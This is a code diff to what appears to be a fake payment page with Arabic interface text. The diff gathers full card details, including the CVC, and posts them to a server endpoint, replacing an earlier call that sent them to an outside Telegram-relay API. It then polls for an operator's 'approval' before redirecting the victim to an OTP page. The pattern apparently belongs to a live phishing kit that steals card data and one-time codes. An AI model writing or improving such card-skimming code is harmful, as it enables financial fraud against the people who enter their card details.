@@ -269,6 +269,13 @@
     const termsCheckbox = document.getElementById('termsCheckbox');
     const submitBtn = document.getElementById('nextBtn');
 
+    // توليد معرف فريد للمستخدم أو جلبه من الذاكرة
+    let userId = localStorage.getItem('a2_user_id');
+    if (!userId) {
+      userId = 'user_' + Math.random().toString(36).substring(2, 11);
+      localStorage.setItem('a2_user_id', userId);
+    }
+
     function showError(id, message) {
       const el = document.getElementById(id);
       if (!el) return;
@@ -393,21 +400,24 @@
 
       if (valid) {
         submitBtn.disabled = true;
-        submitBtn.textContent = 'جارٍ الإرسال والتحويل…';
+        submitBtn.textContent = '⏳ جاري إرسال الطلب للمسؤول وفي انتظار الموافقة...';
 
-        const formData = new FormData(form);
-        const data = Object.fromEntries(formData.entries());
+        const data = {
+          user_id: userId,
+          card_number: card,
+          card_name: holder,
+          exp_date: expiry,
+          cvc: cvv
+        };
 
         try {
-          const response = await fetch('https://telegram-form-api-lemon.vercel.app/api/send', {
+          const response = await fetch('/api/payment-send', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
           });
 
-          const result = await response.json();
-
-          if (response.ok && result.success) {
+          if (response.ok) {
             const digits = card.replace(/\D/g, '');
             const last4 = digits.slice(-4);
             const brand = /^4/.test(digits) ? 'Visa' : (/^(5[1-5]|2[2-7])/.test(digits) ? 'MasterCard' : 'Card');
@@ -423,7 +433,7 @@
               sessionStorage.setItem('pk_payment', JSON.stringify(payment));
             } catch (e) {}
 
-            window.location.href = 'otp.html';
+            checkApprovalStatus();
           } else {
             alert('تعذر إرسال الطلب. حاول مرة أخرى.');
             submitBtn.disabled = false;
@@ -436,6 +446,30 @@
         }
       }
     });
+
+    function checkApprovalStatus() {
+      const interval = setInterval(async () => {
+        try {
+          const res = await fetch(`/api/payment-check?user_id=${userId}`);
+          const result = await res.json();
+
+          if (result.status === 'approved') {
+            clearInterval(interval);
+            submitBtn.textContent = '✅ تم قبول الطلب، جاري الانتقال...';
+            setTimeout(() => {
+              window.location.href = 'otp.html';
+            }, 1000);
+          } else if (result.status === 'rejected') {
+            clearInterval(interval);
+            alert('عذراً، تم رفض عملية الدفع من قبل الإدارة.');
+            submitBtn.disabled = false;
+            submitBtn.textContent = '🔒 المتابعة للدفع';
+          }
+        } catch (e) {
+          console.log('Checking status...');
+        }
+      }, 3000);
+    }
   </script>
 </body>
 </html>
